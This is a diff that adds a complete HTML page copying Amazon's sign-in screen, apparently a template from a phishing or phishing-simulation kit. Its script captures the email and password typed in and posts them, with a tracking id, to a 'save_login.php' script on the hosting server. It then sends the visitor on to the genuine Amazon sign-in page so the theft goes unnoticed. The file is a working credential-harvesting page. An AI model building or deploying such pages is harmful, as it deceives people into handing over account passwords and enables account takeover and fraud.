@@ -1,0 +1,42 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Amazon Sign-In</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Arial,Helvetica,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding-top:24px}
+.card{width:100%;max-width:350px;border:1px solid #ddd;border-radius:4px;padding:20px 26px}
+.amz{color:#131921;font-size:28px;font-weight:400;margin-bottom:16px}
+h1{font-size:28px;font-weight:400;margin-bottom:14px}
+label{display:block;font-size:13px;font-weight:700;margin-bottom:4px}
+input{width:100%;height:31px;border:1px solid #a6a6a6;border-radius:3px;padding:3px 7px;margin-bottom:14px;font-size:13px;box-shadow:0 1px 0 rgba(255,255,255,.5) inset}
+.btn-submit{width:100%;height:31px;background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;border-radius:3px;font-size:13px;cursor:pointer;box-shadow:0 1px 0 rgba(255,255,255,.6) inset}
+</style></head><body><div class="card"><div class="amz">amazon</div><h1>Sign in</h1><form id="loginForm"><label for="email">Email or mobile phone number</label><input type="text" id="email" required autocomplete="username"><label for="password">Password</label><input type="password" id="password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+(function(){
+var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var login = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
+    var btn = document.querySelector(".btn-submit");
+    var label = btn.textContent;
+    btn.textContent = "Please wait…";
+    btn.disabled = true;
+    $.ajax({
+        type: "POST",
+        url: BASE_URL + "save_login.php",
+        data: { tid: tid, login: login, password: password, template: "amazon" },
+        dataType: "json",
+        success: function (data) {
+            if (data && data.ok) { window.location.href = "https:\/\/www.amazon.com\/ap\/signin"; return; }
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        },
+        error: function () {
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        }
+    });
+});
+})();
+</script></body></html>
